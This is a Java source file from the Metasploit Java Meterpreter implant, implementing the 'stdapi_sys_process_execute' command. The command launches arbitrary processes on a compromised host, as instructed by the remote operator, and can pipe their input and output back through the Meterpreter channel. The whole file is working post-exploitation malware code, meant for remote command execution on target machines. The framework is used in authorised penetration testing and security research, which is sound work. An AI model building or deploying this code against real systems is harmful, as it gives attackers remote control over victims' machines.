package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.ProcessChannel;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class stdapi_sys_process_execute implements Command {

    private static final int PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1);
    private static final int PROCESS_EXECUTE_FLAG_ARG_ARRAY = (1 << 8);

    private static int pid = 0;

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        String cmd = request.getStringValue(TLVType.TLV_TYPE_PROCESS_PATH);
        if (cmd.length() == 0) {
            return ERROR_FAILURE;
        }

        int flags = request.getIntValue(TLVType.TLV_TYPE_PROCESS_FLAGS);
        Process proc;
        if ((flags & PROCESS_EXECUTE_FLAG_ARG_ARRAY) != 0) {
            List rawArgs = request.getValues(TLVType.TLV_TYPE_PROCESS_ARGUMENT);
            ArrayList<String> args = new ArrayList<String>();
            for (int i = 0; i < rawArgs.size(); ++i) {
                args.add((String) rawArgs.get(i));
            }
            proc = execute(cmd, args);
        } else {
            String argsString = request.getStringValue(TLVType.TLV_TYPE_PROCESS_ARGUMENTS, "");
            StringBuilder cmdbuf = new StringBuilder();
            cmdbuf.append(cmd);
            if (argsString.length() > 0) {
                cmdbuf.append(" ");
                cmdbuf.append(argsString);
            }
            proc = execute(cmdbuf.toString());
        }


        if ((flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) != 0) {
            ProcessChannel channel = new ProcessChannel(meterpreter, proc);
            synchronized (stdapi_sys_process_execute.class) {
                pid++;
                response.add(TLVType.TLV_TYPE_PID, pid);
                response.add(TLVType.TLV_TYPE_PROCESS_HANDLE, (long) pid);
            }
            response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        } else {
            proc.getInputStream().close();
            proc.getErrorStream().close();
            proc.getOutputStream().close();
        }
        return ERROR_SUCCESS;
    }

    protected Process execute(String cmd, ArrayList<String> args) throws IOException {
        ArrayList<String> cmdAndArgs = new ArrayList<String>();
        cmdAndArgs.add(cmd);
        cmdAndArgs.addAll(args);
        ProcessBuilder builder = new ProcessBuilder(cmdAndArgs);
        return builder.start();
    }

    protected Process execute(String cmdstr) throws IOException {
        Process proc = Runtime.getRuntime().exec(cmdstr);
        return proc;
    }
}
